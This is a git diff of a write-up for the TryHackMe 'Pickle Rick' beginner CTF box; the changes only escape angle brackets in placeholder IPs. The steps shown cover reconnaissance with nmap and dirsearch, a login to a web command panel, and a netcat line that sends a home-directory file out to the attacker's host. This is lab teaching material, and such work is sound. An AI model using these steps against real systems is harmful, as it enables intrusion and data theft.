@@ -8,7 +8,7 @@ This is a truly fun, easy box, great for beginners, and quite entertaining for '
 Because TryHackMe's machines don't have specific IPs assigned to them (and I had to restart my instance during the CTF, thus changing its IP), I'll simply use <targetIP> where you should put the target's IP.
 
 We begin with the nmap scan:
-> nmap -Pn -sC -sV --min-rate=10000 <targetIP>
+> nmap -Pn -sC -sV --min-rate=10000 \<targetIP>
 
 ![Pickle-Rick](../Images/thm_pickle-rick_2.png)
 
@@ -21,7 +21,7 @@ So we're tasked with finding 3 flags (ingredients). Looking at the page's source
 ![Pickle-Rick](../Images/thm_pickle-rick_4.png)
 
 We'll save the username for later. Now we can run a fuzzer, such as dirsearch:
-> dirsearch -u http://<targetIP>
+> dirsearch -u http://\<targetIP>
 
 ![Pickle-Rick](../Images/thm_pickle-rick_5.png)
   
@@ -30,7 +30,7 @@ The robots.txt file shows us 'Wubbalubbadubdub'. The login.php brings us a login
 ![Pickle-Rick](../Images/thm_pickle-rick_6.png)
   
 We're able to login with those credentials. In the webpage we see a Command Panel. In the www-data user root directory, we can see a txt file containing a 'super secret ingredient', which we can read directly from the browser - this is our first ingredient. 
-> http://<targetIP>/Sup3rS3cretPickl3Ingred.txt
+> http://\<targetIP>/Sup3rS3cretPickl3Ingred.txt
 
 ![Pickle-Rick](../Images/thm_pickle-rick_7.png)
   
@@ -42,7 +42,7 @@ In your machine start a netcat session:
 ![Pickle-Rick](../Images/thm_pickle-rick_8.png)
 
 Then in the command panel:
-> /bin/sh | nc <yourIP> 9003 < /home/rick/'second ingredients'
+> /bin/sh | nc \<yourIP> 9003 < /home/rick/'second ingredients'
 
 ![Pickle-Rick](../Images/thm_pickle-rick_9.png)
 
